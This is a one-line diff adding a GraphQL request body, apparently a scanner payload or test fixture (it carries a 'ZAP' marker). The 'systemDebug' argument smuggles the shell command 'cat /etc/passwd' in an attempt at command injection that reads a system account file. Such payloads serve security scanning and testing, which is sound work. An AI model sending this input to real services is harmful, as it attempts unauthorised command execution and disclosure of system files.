@@ -1,0 +1,1 @@
+{"query":"{systemDebug(arg:\"ZAP&cat \\/etc\\/passwd&\")}","variables":{}}
